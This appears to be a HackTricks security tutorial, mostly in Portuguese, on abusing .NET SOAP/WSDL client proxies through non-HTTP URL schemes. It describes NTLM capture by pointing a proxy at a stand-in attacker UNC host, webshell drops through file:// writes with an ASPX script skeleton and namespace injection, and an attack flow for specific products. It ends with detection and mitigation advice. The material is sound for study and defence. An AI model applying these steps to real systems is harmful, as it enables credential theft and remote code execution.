# .NET SOAP/WSDL Client Proxy Abuse

{{#include ../../banners/hacktricks-training.md}}

## TL;DR

- `SoapHttpClientProtocol`, `DiscoveryClientProtocol` and friends inherit from `HttpWebClientProtocol`, whose `GetWebRequest()` returns the scheme-agnostic `WebRequest` instance produced by `WebRequest.Create()` without enforcing `HttpWebRequest`.
- If an attacker controls the proxy `Url`, the framework silently swaps in `FileWebRequest`, `FtpWebRequest` or UNC/SMB handlers, turning "HTTP" proxies into NTLM leak gadgets or arbitrary file writers.
- Any feature that imports attacker-supplied WSDL with `ServiceDescriptionImporter` compounds the bug: the WSDL controls the generated proxy constructor, SOAP methods, complex types and namespaces, enabling pre-auth RCE (webshells, script drops) in products such as Barracuda Service Center RMM, Ivanti EPM, Umbraco 8, PowerShell and SSIS.

## Causa raiz: HttpWebClientProtocol é agnóstico quanto ao esquema

`WebClientProtocol.GetWebRequest()` faz `var req = WebRequest.Create(uri)` e o retorna sem alterações. `HttpWebClientProtocol.GetWebRequest()` tenta `req as HttpWebRequest` para definir campos específicos de HTTP, mas ele **ainda retorna o `req` original** mesmo quando o cast falha. Portanto o runtime obedece qualquer esquema presente em `Url`:

- `http(s)://` → `HttpWebRequest`
- `file:///` ou `\\host\share\` → `FileWebRequest`
- `ftp://` → `FtpWebRequest`

`SoapHttpClientProtocol.Invoke()` então envia o corpo POST SOAP através do handler de transporte selecionado, mesmo que isso signifique escrever no disco ou via SMB.

## Primitivo 1 – Captura/relay NTLM via destinos UNC

1. Obtenha controle sobre `SoapHttpClientProtocol.Url` (setter direto, valor de config, linha na base de dados, etc.).
2. Aponte para um caminho UNC como `file://attacker.local/sink/payload`.
3. O CLR abre o caminho via SMB e realiza a autenticação integrada, vazando o challenge/response NTLM para o atacante.
4. Use hashes capturados para cracking offline ou NTLM relay (SMB/HTTP) se signing/EPA estiverem ausentes.

Isto se aplica a **qualquer** proxy SOAP/HTTP .NET que aceite input do usuário, mesmo que nenhuma exploração adicional seja possível.

## Primitivo 2 – Escrita arbitrária de arquivos via `file://`

1. Defina `Url = "file:///inetpub/wwwroot/poc.aspx"` (ou qualquer caminho gravável) antes da chamada ao proxy.
2. Invoque qualquer método SOAP; o framework escreve todo o envelope SOAP no caminho escolhido, sobrescrevendo arquivos existentes.
3. Argumentos controlados pelo usuário aparecem dentro de elementos XML, permitindo que atacantes dropem payloads CSHTML/ASPX ou envenenem arquivos de configuração.

Limitações:

- O conteúdo é sempre XML; campos escalares são entity-encoded, então injetar `<script>` via strings simples requer truques adicionais.
- Payloads significativos precisam de pelo menos um argumento influenciado pelo atacante ou da capacidade de modificar a assinatura do método (ver abuso de WSDL).

O runtime frequentemente lança `Client found response content type of 'application/octet-stream', but expected 'text/xml'` após a escrita — trate esse erro como um IOC.

## Armadilhando importações de WSDL

### Proxies gerados automaticamente via `ServiceDescriptionImporter`

Muitos produtos expõem funcionalidades de "custom web service" que aceitam uma URL de WSDL e então:

1. `ServiceDescription.Read()` o WSDL controlado pelo atacante.
2. `ServiceDescriptionImporter` gera classes proxy em C# que estendem `SoapHttpClientProtocol`.
3. CodeDOM compila o proxy e reflection chama o método solicitado.

O atacante controla totalmente:

- `soap:address` / `soap12:address` `location` → torna-se `base.Url` (pode apontar para `file://` ou caminhos UNC).
- Nomes de métodos, listas de parâmetros, tipos complexos e serializers.
- URIs de namespace que acabam como atributos `xmlns:*` em cada mensagem SOAP.

Nenhuma validação de esquema ocorre, então todo proxy gerado herda a falha original.

### Moldando o envelope SOAP para RCE

- Complex type serialization: defina structs customizadas no WSDL de modo que quando `XmlSerializer` as reemite, produzam nomes/atributos de elemento escolhidos pelo atacante. Para drop de webshell ASPX, confeccione tipos que serializem para:
```xml
<script runat="server">
// payload pulling `Request.QueryString["cmd"]`
</script>
```
e aponte `Url` para `file:///.../webroot/shell.aspx` para obter RCE.
- Namespace injection: mesmo quando os argumentos são fixos (por exemplo, Umbraco Forms), namespaces declarados no WSDL (ex.: `xmlns:tns="http://host/service?x=@{...}"`) são copiados literalmente para o envelope SOAP. Codificar payloads dentro da query string do namespace permite drop de CSHTML Razor ou scripts PowerShell sem controle de parâmetros.

Essas técnicas viabilizaram o exploit contra Barracuda Service Center RMM (CVE-2025-34392): uma chamada SOAP não autenticada forneceu um WSDL malicioso, definiu `soap12:address` para `file:///Program Files/.../SCMessaging/poc.aspx`, injetou `<script runat="server">` via parâmetros complexos e enviou um webshell que executava comandos arbitrários `cmd.exe`.

## Fluxo típico de ataque

1. Identificar funcionalidade que aceita uma URL de WSDL ou que permita usuários configurarem endpoints SOAP (ex.: Barracuda `InvokeRemoteMethod`, conectores Ivanti EPM, datasources de Umbraco 8 Forms, PowerShell `New-WebServiceProxy`).
2. Hospedar um WSDL malicioso cujo `soap:address` aponte para um caminho gravável ou share UNC e cujas definições de schema forneçam métodos/tipos favoráveis a payloads.
3. Disparar a importação/compilação. O alvo emite um DLL proxy com construtor e métodos controlados pelo atacante.
4. Quando a aplicação invocar o método gerado, a requisição SOAP é serializada e escrita no caminho especificado pelo atacante, incorporando o payload.
5. Executar o arquivo dropado (acessar `poc.aspx?cmd=whoami`, carregar o CSHTML, ou deixar PowerShell executar o script) ou reproduzir material NTLM capturado.

## Detecção & hunting

- Static analysis: Grepe por `ServiceDescriptionImporter`, `SoapHttpClientProtocol`, `HttpWebClientProtocol`, ou `New-WebServiceProxy`. Trace como `Url` ou inputs de WSDL são originados—qualquer coisa controlada pelo usuário é um sinal de alerta.
- Runtime telemetry:
- Instrumentar criação de proxy para logar esquemas; alertar em valores `file`, `ftp` ou UNC.
- Monitorar pelo característico erro `Client found response content type of 'application/octet-stream', but expected 'text/xml'` após chamadas SOAP.
- Vigiar por escritas inesperadas de `.aspx/.cshtml/.ps1` em diretórios da aplicação realizadas pela identidade do serviço web.
- Network/file signals: conexões SMB iniciadas por servidores web a infra do atacante, ou compilação súbita de DLLs proxy temporários, frequentemente precedem exploração.

## Mitigações

- Enforce transport validation antes de invocar qualquer proxy derivado de `HttpWebClientProtocol`:
```csharp
var uri = new Uri(proxy.Url);
if (uri.Scheme != Uri.UriSchemeHttp && uri.Scheme != Uri.UriSchemeHttps)
throw new InvalidOperationException("SOAP clients must stay on HTTP/S");
```
- Sanitize imported WSDL: fazer o download do proxy através de um broker que reescreva ou rejeite entradas `soap:address` que não sejam HTTP/S, remova bindings desconhecidos e proíba truques de namespace para payloads.
- Disable untrusted WSDL features: substituir conveniências de "upload a WSDL" por templates server-side verificados ou allowlists.
- Segregar locais de escrita: garantir que app pools não possam escrever em diretórios executáveis; usar volumes separados para dados vs. código para que primitivas de escrita de arquivo não se tornem RCE.
- Harden NTLM exposure: desabilitar SMB de saída quando possível; caso contrário, impor SMB signing, EPA e outras mitigações contra relay.

## References

- [watchTowr Labs – SOAPwn: Pwning .NET Framework Applications Through HTTP Client Proxies and WSDL](https://labs.watchtowr.com/soapwn-pwning-net-framework-applications-through-http-client-proxies-and-wsdl/)

{{#include ../../banners/hacktricks-training.md}}
